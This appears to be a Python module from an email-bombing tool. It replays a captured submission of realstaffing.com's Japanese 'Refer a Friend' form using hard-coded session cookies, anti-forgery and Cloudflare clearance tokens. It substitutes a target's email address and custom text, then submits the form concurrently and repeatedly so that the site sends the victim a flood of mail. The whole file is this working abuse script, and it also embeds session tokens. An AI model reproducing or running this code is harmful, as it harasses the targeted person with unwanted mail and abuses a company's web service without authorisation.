from os.path import basename

import requests

from module import Spam

cookies = {
    'cf_chl_2': '52d43a28c9bb404',
    'cf_clearance': 'd7KaAe2dr_QTAzoFJ00xS2soqNTpSi.YbkLrtYM.EzI-1676562378-0-150',
    'ASP.NET_SessionId': 'ukkq0ajchopsersvtryxniuo',
    '__RequestVerificationToken': 'gd49CVcBDZ0mV3i12d3AfgLdobD5BDV2Wp0Rw9VaRvFAtF2a-xcUEprNjM70ItXFyjBfSNZ8J9SE_uAKsZS-7wkz-e0hLE_o1GfNt8_4AS41',
    'ARRAffinity': 'e6544bf19e630e56176871ae002063ac11fc26dd97b84aa42ebbeab32bc611e2',
    'ARRAffinitySameSite': 'e6544bf19e630e56176871ae002063ac11fc26dd97b84aa42ebbeab32bc611e2',
    'Locale': 'en',
    'OptanonConsent': 'isGpcEnabled=0&datestamp=Thu+Feb+16+2023+17%3A47%3A24+GMT%2B0200+(%D0%92%D0%BE%D1%81%D1%82%D0%BE%D1%87%D0%BD%D0%B0%D1%8F+%D0%95%D0%B2%D1%80%D0%BE%D0%BF%D0%B0%2C+%D1%81%D1%82%D0%B0%D0%BD%D0%B4%D0%B0%D1%80%D1%82%D0%BD%D0%BE%D0%B5+%D0%B2%D1%80%D0%B5%D0%BC%D1%8F)&version=6.35.0&isIABGlobal=false&consentId=679c8ac0-23d3-4c5b-9cc2-796f8d2f16d1&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A0%2CC0003%3A0%2CC0004%3A0&hosts=H63%3A1%2CH65%3A1%2CH37%3A1%2CH67%3A1%2CH72%3A1%2CH74%3A1%2CH82%3A1%2CH34%3A0%2CH35%3A0%2CH78%3A0%2CH36%3A0%2CH31%3A0%2CH64%3A0%2CH80%3A0%2Calc%3A0%2CH83%3A0%2CH88%3A0%2Cejy%3A0%2Cwzr%3A0%2CH77%3A0%2CH79%3A0%2CH4%3A0%2CH94%3A0%2CH66%3A0%2CH38%3A0%2CH39%3A0%2CH7%3A0%2Chsw%3A0%2CH81%3A0%2CH76%3A0%2CH11%3A0%2CH12%3A0&genVendors=&AwaitingReconsent=false',
}

headers = {
    'authority': 'www.realstaffing.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryQBnEW9XYDafb1e7B',
    # 'cookie': 'cf_chl_2=52d43a28c9bb404; cf_clearance=d7KaAe2dr_QTAzoFJ00xS2soqNTpSi.YbkLrtYM.EzI-1676562378-0-150; ASP.NET_SessionId=ukkq0ajchopsersvtryxniuo; __RequestVerificationToken=gd49CVcBDZ0mV3i12d3AfgLdobD5BDV2Wp0Rw9VaRvFAtF2a-xcUEprNjM70ItXFyjBfSNZ8J9SE_uAKsZS-7wkz-e0hLE_o1GfNt8_4AS41; ARRAffinity=e6544bf19e630e56176871ae002063ac11fc26dd97b84aa42ebbeab32bc611e2; ARRAffinitySameSite=e6544bf19e630e56176871ae002063ac11fc26dd97b84aa42ebbeab32bc611e2; Locale=en; OptanonConsent=isGpcEnabled=0&datestamp=Thu+Feb+16+2023+17%3A47%3A24+GMT%2B0200+(%D0%92%D0%BE%D1%81%D1%82%D0%BE%D1%87%D0%BD%D0%B0%D1%8F+%D0%95%D0%B2%D1%80%D0%BE%D0%BF%D0%B0%2C+%D1%81%D1%82%D0%B0%D0%BD%D0%B4%D0%B0%D1%80%D1%82%D0%BD%D0%BE%D0%B5+%D0%B2%D1%80%D0%B5%D0%BC%D1%8F)&version=6.35.0&isIABGlobal=false&consentId=679c8ac0-23d3-4c5b-9cc2-796f8d2f16d1&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A0%2CC0003%3A0%2CC0004%3A0&hosts=H63%3A1%2CH65%3A1%2CH37%3A1%2CH67%3A1%2CH72%3A1%2CH74%3A1%2CH82%3A1%2CH34%3A0%2CH35%3A0%2CH78%3A0%2CH36%3A0%2CH31%3A0%2CH64%3A0%2CH80%3A0%2Calc%3A0%2CH83%3A0%2CH88%3A0%2Cejy%3A0%2Cwzr%3A0%2CH77%3A0%2CH79%3A0%2CH4%3A0%2CH94%3A0%2CH66%3A0%2CH38%3A0%2CH39%3A0%2CH7%3A0%2Chsw%3A0%2CH81%3A0%2CH76%3A0%2CH11%3A0%2CH12%3A0&genVendors=&AwaitingReconsent=false',
    'origin': 'https://www.realstaffing.com',
    'referer': 'https://www.realstaffing.com/en-jp/candidate/refer-a-friend/',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
}

s = 'thank'


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = '------WebKitFormBoundaryQBnEW9XYDafb1e7B\r\nContent-Disposition: form-data; name="__RequestVerificationToken"\r\n\r\nZI9EbGsB6qDYJVyU5lU0VnDEqfkTB1vwUw9ChBaa-OYA_m1-osVPDQvML_C8U-mmTLmMkC4-rZsCwj4vIO54HsNb_WKWR6n5vwUlH0yuxbk1\r\n------WebKitFormBoundaryQBnEW9XYDafb1e7B\r\nContent-Disposition: form-data; name="FormId"\r\n\r\n114057fd-7494-43d1-aa7f-19840cd8dfed\r\n------WebKitFormBoundaryQBnEW9XYDafb1e7B\r\nContent-Disposition: form-data; name="FormName"\r\n\r\nen-JP - Refer a Friend form\r\n------WebKitFormBoundaryQBnEW9XYDafb1e7B\r\nContent-Disposition: form-data; name="RecordId"\r\n\r\n00000000-0000-0000-0000-000000000000\r\n------WebKitFormBoundaryQBnEW9XYDafb1e7B\r\nContent-Disposition: form-data; name="PreviousClicked"\r\n\r\n\r\n------WebKitFormBoundaryQBnEW9XYDafb1e7B\r\nContent-Disposition: form-data; name="Theme"\r\n\r\nbootstrap3-horizontal\r\n------WebKitFormBoundaryQBnEW9XYDafb1e7B\r\nContent-Disposition: form-data; name="FormStep"\r\n\r\n0\r\n------WebKitFormBoundaryQBnEW9XYDafb1e7B\r\nContent-Disposition: form-data; name="RecordState"\r\n\r\nMzFBQ0Q5MjlERTQzRkMxQjFEMjAxOTc4Qjg2MDVCQTI0MDU4MjY2QkI3OTI2MDM5QTYyMURFQjEzNTA3QTYyQjRCMjIwNTcxQTY1MTgyNUMyQTA0OTBERDU4MjA4MjU3MjBFMUQwRUZEOURFQkE4QTE4NzI5NTAyNkNCQjhGQjNCQTFEMkZERjhGMEY1MTM1RDYwNEFFRTY2MEYyQ0YwODcyMzhBNjlDNThENzAwRUQ2OTkwRTcxOTc2Qzk1MkE0REM0MUU2ODJEQzMyOTNEQTI2MzIzOUNCM0U2MDY2NjRDMjNBN0Y0M0YyM0I5NTlDRTlEMjIzNTE4MDhBQjU2MDlDOTlDNjY3QTM3N0IxNTU4MUM1MTE3RTQ3MkFFMkNGNDlEN0Y5ODVGN0NBQTI4MTlGRDk0QjZGQzkzNDVFRDQ2RUU4NjUwMEI4NzIxQjU0QkE1QUFFQUQ0MEQ3NDkyRDUzNUQxMTc5MERBNDUwOUU4Njg2M0ZDNjk1RTQ1NjRFNjFCMzRDNEQ4MzA3NDUyM0I5NUYyQTU2MDA0MTE3QjYwQUNBNEZCMjEyQTVFMTU5Qjk4QjFEMTMxRDNBMjc4QTE4MzkxM0E1MDk5RTg1OEFBQUZFMTVFQTdGQjMyQ0NBMkRFRUM3Njc4RThGRjc0NkYwREIzMTFCMzdERTU4OEY2NEU3MjYxQjE0RDYzNzMzRURCM0YxREVERkVGMkI5RjEyMTU0MjEyQTg5MzBEN0IwRkNFOEM0RTQ4OEMzRjk0QzgyMjkxQzhEQUNDOENDNUFFODU0RjFBNzMwODg3OTVGNjQ0Nzk5OEI3NjIyMzdFNTU2MDQ1MjVFMjU5NjU2Rjc2RDFFMTVGOEUyNjI5NTk1MUI1RkEyNzAyREE3NTMzNDExRkMxRTZDNTEyMDJFNDNFQ0RENTE3REE1NjBCNzE1RDBGNzg3NUZGMEFBNUM5RkMzQzQ2RTZDMEJDMUUwQTUwRjQxMzlGRjEwQkY3M0IzQjFBRTJEQkNDMUI5NkU4MzQyMDExQzQ0MjM0QUNBMUQzQ0RBQjA0NjE0NkYyQjZCQzJDRkMwNDI5MDRDRkQwNjlGOTBGMjZCNTFFNzkxQ0U0QjkxRDkxQ0U1OTdDMjRFMjYwNTM2NkREQUUzOTZBREEzRUU0NkQ2REFCQzdEQjFFRUU1QTIyMENDOEY4MzlBRkI0MzUyQ0I3NzM2NzczOUQ2RkZFMjQ3NEM4MDVGQzZFNTFENzNDMTZBM0U3Mzg1OEU2QjY4MkJENjg0RjYwMEJGMjg5RTlDQUE1RTc1OUU1MTg2QkE1RjZGRkY3NTlGODRDRUY5MzI4NjI0OTU4NDc2RkZBQjIzRUQ4NDVDNjdFNzI3REY5RjU0MDQ1M0UyOUY2MEMxMEJEMEFDNjM2MEFFNzc0MkUyRDUyRDBFODRFQTA2RkM0NTVEMUFBNTdFQkZGNDlCOEJCMjg2RjFGMEQ1RUJBRkREOTgyNTkwOEZDRjI2M0UxM0Q0MkU5QURENDMzRTY0MzZCNjhGNERBQTJGNzgyQkE2QUQzQzY1QzkxM0UzMjIxMzVEM0RBRDA3ODgyMjQ1REE2N0I5REUxRDhBMkY1RTdBQUZGQTczMTc1MzJDRURENDZGNjlENkVFNTVBQzkyNzEzMUY2RTg4RkNDNEFBQUE5NDQ4RTU1M0UxNThEQTlGNEM4QjMxQUVBRjgwRkQxNDU2ODIyNkM5NjM0MDA0Qjk0MzgxN0JBOTY3MEFDOEY1N0JDNUVCNjIzRDM3NjA4NEM1MUMwMDhEOUMxOTQ1MDU5MDk5RTQ4REMwN0JBRUEwODcyQTQ2QkI2MkI4QzE2RUFGMEVFMjNBMEEyMjAxRkM5RUJFOTFEMTFERUVBNjRBMjFBRURDMjUwREYwMDk5QzFCRTAwRjE3RjNGNzVCNERBN0U2RDY3NzNGMzgxM0I5MzJDOTRDMEJGM0QzQjE1QjU1MUQwM0Q5NURCRTBENzg1MjY1NEE4Nw==\r\n------WebKitFormBoundaryQBnEW9XYDafb1e7B\r\nContent-Disposition: form-data; name="FillMeInIfYouDare"\r\n\r\n\r\n------WebKitFormBoundaryQBnEW9XYDafb1e7B\r\nContent-Disposition: form-data; name="e11c7a77-9d86-41c9-ed8e-48b761555a05"\r\n\r\ntest\r\n------WebKitFormBoundaryQBnEW9XYDafb1e7B\r\nContent-Disposition: form-data; name="bc25a347-08c8-40d2-ddd5-db5d46ec3cc3"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryQBnEW9XYDafb1e7B\r\nContent-Disposition: form-data; name="c9204231-7756-4e10-cb50-60870fb4bb73"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryQBnEW9XYDafb1e7B\r\nContent-Disposition: form-data; name="3a316377-d15c-47db-8347-5f88323c5f46"\r\n\r\n12312312\r\n------WebKitFormBoundaryQBnEW9XYDafb1e7B\r\nContent-Disposition: form-data; name="8eec6f0f-1db6-46c7-a7c1-b9a7046e3649"\r\n\r\ntest\r\n------WebKitFormBoundaryQBnEW9XYDafb1e7B\r\nContent-Disposition: form-data; name="1ee7b1dd-3009-46c9-a0b8-9dd8334cf888"\r\n\r\ntest\r\n------WebKitFormBoundaryQBnEW9XYDafb1e7B\r\nContent-Disposition: form-data; name="c71454a6-f8b9-432a-cb74-11695236d501"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryQBnEW9XYDafb1e7B\r\nContent-Disposition: form-data; name="32011931-dc1d-4a91-b48f-df89d84b681e"\r\n\r\ntest\r\n------WebKitFormBoundaryQBnEW9XYDafb1e7B\r\nContent-Disposition: form-data; name="114057fd749443d1aa7f19840cd8dfed"\r\n\r\n\r\n------WebKitFormBoundaryQBnEW9XYDafb1e7B\r\nContent-Disposition: form-data; name="ufprt"\r\n\r\nD845E41B558F9212A89CEC83EC5CD9D32964D2B81A167BE63597EC4DF22629E454AA60B14754A8961070228B50DB3466A04025E6DE73708988DC60A52EB79A577A0F1325E5AEA4AEBE2BF6D7DB074B4FF4C9C4FB6A9E5E17D9BD6C36F0B196AFEFAF8425A41F604881C19CA88516541E5C5526351478548807DA77DEE585293D3704B3ED59A63E33524D063E72284254\r\n------WebKitFormBoundaryQBnEW9XYDafb1e7B--\r\n'
        data = data.replace('wezxasqw@gmail.com', target).replace('test', self.get_text())

        response = requests.post(
            'https://www.realstaffing.com/en-jp/candidate/refer-a-friend/',
            cookies=cookies,
            headers=headers,
            data=data.encode(),
        )
        return response


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
